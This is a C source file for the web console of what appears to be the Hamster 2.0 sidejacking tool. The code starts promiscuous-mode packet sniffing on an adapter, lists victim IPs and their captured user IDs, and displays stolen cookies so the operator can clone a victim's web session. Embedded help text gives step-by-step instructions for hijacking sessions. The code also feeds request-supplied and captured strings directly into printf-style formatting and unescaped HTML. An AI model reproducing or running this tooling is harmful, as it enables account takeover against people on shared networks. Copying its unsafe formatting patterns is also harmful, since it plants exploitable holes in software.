#include "platform.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <time.h>

#include "hamster.h"
#include "cookiedb.h"
//#include "debugconnection.h"
//#include "serveconsole.h"
#include "mongoose.h"
#include "pixie.h"


static int has_bad_extension(const char *url)
{
/*	unsigned i;
	const char *ext;
	static const char *ext_list[] = {
		".jpg",
		".gif",
		".css",
		".ico",
		".js",
		".png",
		0
	};
*/
	UNUSEDPARM(url);
	return 0;
/*	if (*url == '\0')
		return 0;

	i = strlen(url);
	while (i>0 && url[i-1] != '.')
		i--;

	if (i == 0)
		return 0;

	ext = url+i-1;

	for (i=0; ext_list[i]; i++)
		if (stricmp(ext, ext_list[i]) == 0)
			return 1;

	return 0;
	*/
}


/**
 * Render the root console page, which is "http://hamster/". This is a
 * frameset that will show the currently selected target on the left
 * and the list of possible targets on the main page
 */
void
hamster_root(struct mg_connection *conn, const struct mg_request_info *ri,
		void *user_data)
{
	UNUSEDPARM(ri);
	UNUSEDPARM(user_data);

	mg_header_printf(conn,
			"HTTP/1.0 200 ok\r\n"
			"Content-Type: text/html; charset=us-ascii\r\n"
			"Server: hamster/2.0\r\n"
			"\r\n");
	
	mg_printf(conn,
			"<html>\r\n"
			" <head><title>Hamster</title></head>\r\n"
			"  <frameset cols=\"10%%,*\">\r\n"
			"   <frame src=\"/left.html\" name=\"hamster1\" />\r\n"
			"   <frame src=\"/right.html\" name=\"hamster2\" />\r\n"
			"  </frameset>\r\n"
			"</html>\r\n"
			);
}

void
hamster_adapter(struct mg_connection *conn, const struct mg_request_info *ri,
		void *user_data)
{
	UNUSEDPARM(ri);
	UNUSEDPARM(user_data);
	
	mg_header_printf(conn,
			"HTTP/1.0 200 ok\r\n"
			"Content-Type: text/html; charset=us-ascii\r\n"
			"Server: hamster/2.0\r\n"
			"\r\n");
	
	mg_printf(conn,
			"<html>\r\n"
			" <head><title>Hamster</title></head>\r\n"
			"<body>\r\n"
			"<p>To start monitoring, type in the adapter name and hit the [Submit] button.\r\n"
			"This adapter must support 'promiscuous' mode monitoring. You may have to first \r\n"
			"configure the adapter on the command line, especially for wifi adapters</p>\r\n"
			"<form action=\"/startadapter.html\" method=\"GET\">\r\n"
			"<input type=\"text\" name=\"adaptername\" value=\"eth0\">\r\n"
			"<input type=\"submit\">\r\n"
			"</form>\r\n"
			"</body>\r\n"
			"</html>\r\n"
			);
}

extern void myprox_ferret_thread(void *v_parms);

void
hamster_startadapter(struct mg_connection *conn, const struct mg_request_info *ri,
		void *user_data)
{
	char *adaptername;
	struct MyProx *myprox = (struct MyProx*)user_data;
	UNUSEDPARM(ri);

	adaptername = mg_get_var(conn, "adaptername");

	fprintf(stderr, "starting adapter %s\n", adaptername);
	mg_header_printf(conn,
			"HTTP/1.0 302 ok\r\n"
			"Location: /right.html\r\n"
			"Content-Type: text/html; charset=us-ascii\r\n"
			"Server: hamster/2.0\r\n"
			"\r\n");
	
	mg_printf(conn,
			"<html>\r\n"
			" <head><title>Hamster</title></head>\r\n"
			"<body>\r\n"
			"Moved <a href=\"/\">here</a>\r\n"
			"</body>\r\n"
			"</html>\r\n"
			);

	{
		struct FerretThreadParms *parms;
		parms = (struct FerretThreadParms*)malloc(sizeof(*parms));
		memset(parms, 0, sizeof(*parms));

		pixie_snprintf(parms->adaptername, sizeof(parms->adaptername), "%s", adaptername);
		parms->myprox = myprox;

		pixie_begin_thread(myprox_ferret_thread, 0, parms);
	}

	mg_free_var(adaptername);
}

void
hamster_status(struct mg_connection *conn, const struct mg_request_info *ri,
		void *user_data)
{
	unsigned i;
	struct MyProx *myprox = (struct MyProx*)user_data;
	UNUSEDPARM(ri);

	mg_header_printf(conn,
			"HTTP/1.0 200 ok\r\n"
			"Content-Type: text/xml\r\n"
			"Server: hamster/2.0\r\n"
			"\r\n");
	
	mg_printf(conn, "<?xml version=\"1.0\" ?>\r\n");
	mg_printf(conn, "<hamsterstatus timestamp=\"%u\">\r\n", time(0));
	if (myprox->m_instance[0]) {
		mg_printf(conn, " <message>Cloned target: %s</message>\r\n", myprox->m_instance);
		mg_printf(conn, " <code>3</code>\r\n");
	} else {
		mg_printf(conn, " <message>No cloned target</message>\r\n");
		mg_printf(conn, " <code>2</code>\r\n");
	}

	mg_printf(conn, " <adapters>");
	for (i=0; i<myprox->adapter_count; i++) {
	if (i == 0)
		mg_printf(conn, "%s ", myprox->adapters[i].adaptername);
	}
	if (i == 0)
		mg_printf(conn, "none ");
	mg_printf(conn, "</adapters>\r\n");

	mg_printf(conn, " <recordcount>%u</recordcount>\r\n", cookiedb_record_count);
	mg_printf(conn, " <packetcount>%u</packetcount>\r\n", cookiedb_packet_count);
	mg_printf(conn, " <targetcount>%u</targetcount>\r\n", cookiedb_get_instance_count());

	mg_printf(conn, "</hamsterstatus>\r\n");
}



/**
 * Shows the left-hand pane of the initial frameset. This will show a list
 * of URLs that we've seen on the target, plus a special list of "well-known"
 * URLs
 */
void
hamster_left(struct mg_connection *conn, const struct mg_request_info *ri,
		void *user_data)
{
	struct MyProx *myprox = (struct MyProx*)user_data;
	char *instance;
	UNUSEDPARM(ri);

	/*
	 * Get the "instance" IP address. This will be the IP address
	 * whose cookies we are going to clone
	 */
	instance = mg_get_var(conn, "instance");
	if (instance)
		snprintf(myprox->m_instance, sizeof(myprox->m_instance), "%s", instance);
	else
		myprox->m_instance[0] = '\0';
	mg_free_var(instance);

	/*
	 * Print the HTTP response headers.
	 */
	mg_header_printf(conn,
			"HTTP/1.0 200 ok\r\n"
			"Content-Type: text/html; charset=us-ascii\r\n"
			"Server: hamster/2.0\r\n"
			"\r\n");

	/*
	 * Print HTML header
	 */
	mg_printf(conn,
		"<html>\r\n"
		" <head><title>Hamster 1</title></head>\r\n"
		" <body><h1>");

	if (myprox->m_instance[0] == '\0')
		mg_printf(conn, "-- no cloned target --</h1>\r\n"
				"<p>No target has been selected yet</p>\r\n"
				);
	else {
		char *url_list;
		char *p;

		mg_printf(conn, myprox->m_instance);
		mg_printf(conn, "</h1>\r\n");

		mg_printf(conn, "<a href=\"http://hamster/cookies.html?instance=\"");
		mg_printf(conn, myprox->m_instance);
		mg_printf(conn, "\" target=_blank>[cookies]</a><p>\r\n");

		/* Display the well-known URLs */
		url_list = cookiedb_get_url2_list(myprox->m_instance);
		mg_printf(conn, "<ul>\r\n");
		for (p=url_list; *p; p += strlen(p)+1) {
			const char *host;
			const char *url;
			char *tmp;
			unsigned len;

			host = p;
			p += strlen(p)+1;
			url = p;

			if (has_bad_extension(url))
				continue;


			len = 2*strlen(host) + 2*strlen(url) + 100;
			tmp = malloc(len);

			sprintf_s(
				tmp, len, 
				"<li><a href=\"http://%s%s\" target=\"__blank\">http://%s%s</a></li>\r\n",
				host, url,
				host, url);
	
			mg_printf(conn, tmp);
			free(tmp);
		}
		mg_printf(conn, "</ul>\r\n");

		/* Display the big cookie list */
		url_list = cookiedb_get_url_list(myprox->m_instance);
		mg_printf(conn, "<ul>\r\n");
		for (p=url_list; *p; p += strlen(p)+1) {
			const char *host;
			const char *url;
			char *tmp;
			unsigned len;

			host = p;
			p += strlen(p)+1;
			url = p;

			if (has_bad_extension(url))
				continue;

			len = 2*strlen(host) + 2*strlen(url) + 100;
			tmp = malloc(len);

			sprintf_s(tmp, len, "<li><a href=\"http://%s%s\" target=\"hamster2\">http://%s%s</a></li>\r\n",
				host, url,
				host, url);
	
			mg_write(conn, tmp, strlen(tmp));
			free(tmp);
		}

		cookiedb_free(url_list);
	}



	mg_printf(conn,
		"  </ul>\r\n"
		" </body>\r\n"
		"</html>\r\n"
		);
}

void
hamster_right(struct mg_connection *conn, const struct mg_request_info *ri,
		void *user_data)
{
	struct MyProx *myprox = (struct MyProx*)user_data;
	unsigned instance_count = 0;
	UNUSEDPARM(ri);

	mg_header_printf(conn,
			"HTTP/1.0 200 ok\r\n"
			"Content-Type: text/html; charset=us-ascii\r\n"
			"Server: hamster/2.0\r\n"
			"\r\n");
	mg_printf(conn,
		"<html>\r\n"
		" <head>\r\n"
		" <title>Hamster 2</title>\r\n"
		" <link rel=\"stylesheet\" type=\"text/css\" href=\"hamster.css\" />\r\n"
		" <link rel=\"shortcut icon\" href=\"favicon.ico\" type=\"image/x-icon\" />\r\n"
		" <script type=\"text/javascript\" src=\"hamster.js\"></script>\r\n"
		"</head>\r\n"
		" <body onload=\"setInterval(refresh_status,1000)\">\r\n"
		"   <p id=\"title\">HAMSTER 2.0 Side-Jacking</p>\r\n"
		"   <p id=\"menu\">[ <a href=\"adapters.html\">adapters</a> | <a href=\"http://hamster.erratasec.com/help/\">help</a> ]</p>\r\n"
		"   <div class=\"help\" onclick=\"this.setAttribute('style','display:none')\">\r\n"
		"    <b>STEPS:</b>In order to sidejack web sessions, follow these steps. FIRST, click on \r\n"
		"    the adapter menu and start sniffing. SECOND, wait a few seconds and make sure packets are \r\n"
		"    being received. THIRD, wait until targets appear. FOURTH, click on that target to \"clone\" \r\n"
		"    it's session. FIFTH, purge the cookies from your browser just to make sure none of them conflict \r\n"
		"    with the cloned targets.\r\n"
		"    again\r\n"
		"   </div>\r\n"
		"   <div class=\"help\" onclick=\"this.setAttribute('style','display:none')\">\r\n"
		"    <b>TIPS</b>: remember to refresh this page occasoinally to see updates, and make sure to purge all cookies from the browser\r\n"
		"   </div>\r\n");
	mg_printf(conn,
		"   <div class=\"help\" onclick=\"this.setAttribute('style','display:none')\">\r\n"
		"    <b>WHEN SWITCHING</b> target, rember to close all windows in your browser and purge all cookies first\r\n"
		"   </div>\r\n");
	mg_printf(conn,
		"   <table id=\"statustable\"><tr colspan=\"2\"><th id=\"statustitle\">Status</th></tr>\r\n"
		"   <tr><th>Proxy:</th><td id=\"hamsterstatus\" class=\"statuserror\">unknown</td></tr>\r\n");
	mg_printf(conn, 
		"   <tr><th>Adapters:</th><td id=\"adapterstatus\" class=\"%s\">", 
		myprox->adapter_count?"statusok":"statuserror");
	if (myprox->adapter_count == 0)
		mg_printf(conn, "none ");
	else {
		unsigned i;
		for (i=0; i<myprox->adapter_count; i++)
			mg_printf(conn, "%s ", myprox->adapters[i].adaptername);
	}
	mg_printf(conn, "</td></tr>\r\n");
	mg_printf(conn, 
		"   <tr><th>Packets:</th><td id=\"packetstatus\" class=\"%s\">%u</td></tr>\r\n",
		cookiedb_packet_count?"statusok":"statuserror", cookiedb_packet_count
		);
	mg_printf(conn, 
		"   <tr><th>Database:</th><td id=\"dbstatus\" class=\"%s\">%u</td></tr>\r\n",
		cookiedb_record_count?"statusok":"statuserror", cookiedb_record_count
		);
	instance_count = cookiedb_get_instance_count();
	mg_printf(conn, 
		"   <tr><th>Targets:</th><td id=\"targetstatus\" class=\"%s\">%u<script>last_instance_count=%u;</script></td></tr>\r\n",
		instance_count?"statusok":"statuserror", instance_count, instance_count
		);
	mg_printf(conn,
		"   </table>\r\n"
		"<ul>\r\n"
		);
	{
		char *instance_list = cookiedb_get_instance_list();
		char *p;

		for (p=instance_list; *p; p += strlen(p)+1) {
			const char *instance = p;
			char tmp[1024];
			char *userid_list;
			
			if (cookiedb_is_empty(instance))
				continue;
			
			userid_list = cookiedb_get_userid_list(instance);
			sprintf_s(tmp, sizeof(tmp), "<li><a href=\"/left.html?instance=%s\" target=\"hamster1\">%s</a> %s</li>\r\n", instance, instance, userid_list);
			cookiedb_free(userid_list);
			mg_printf(conn, tmp);
		}

		cookiedb_free(instance_list);
	}

	mg_printf(conn,
		"</ul>\r\n"
		" </body>\r\n"
		"</html>\r\n"
		);
}


void
hamster_cookies(struct mg_connection *conn, const struct mg_request_info *ri,
		void *user_data)
{
	struct MyProx *myprox = (struct MyProx*)user_data;
	char *cookie_list = cookiedb_get_cookie_list(myprox->m_instance);
	char *p;
	UNUSEDPARM(ri);
	UNUSEDPARM(user_data);

	/* HTTP headers */
	mg_header_printf(conn,
			"HTTP/1.0 200 ok\r\n"
			"Content-Type: text/html; charset=us-ascii\r\n"
			"Server: hamster/2.0\r\n"
			"\r\n");
	mg_printf(conn,
		"<html>\r\n"
		" <head><title>Cookie Info</title></head>\r\n"
		" <body>\r\n <h1>Cookie Info: ");
	mg_printf(conn, "%s", myprox->m_instance);
	mg_printf(conn, "</h1>\r\n");
	
	for (p=cookie_list; *p; p += strlen(p)+1) {
		mg_printf(conn, "[");
		mg_printf(conn, "%s", p);
		mg_printf(conn, "]<ul>\r\n");
		p += strlen(p)+1;

		for (;*p; p+=strlen(p)+1) {
			mg_printf(conn, "<li>");
			mg_printf(conn, "%s", p);
			mg_printf(conn, "<ul>\r\n");
			p += strlen(p)+1;
			for (;*p; p+=strlen(p)+1) {
				mg_printf(conn, "<li>");
				mg_printf(conn, "%s", p);
				mg_printf(conn, " = ");
				p += strlen(p)+1;
				mg_printf(conn, "%s", p);
				mg_printf(conn, "\r\n");
			}
			mg_printf(conn, "</ul>\r\n");
		}
		mg_printf(conn, "</ul>\r\n");
	}


	cookiedb_free(cookie_list);
	mg_printf(conn,
		"\r\n"
		" </body>\r\n"
		"</html>\r\n"
		);
}
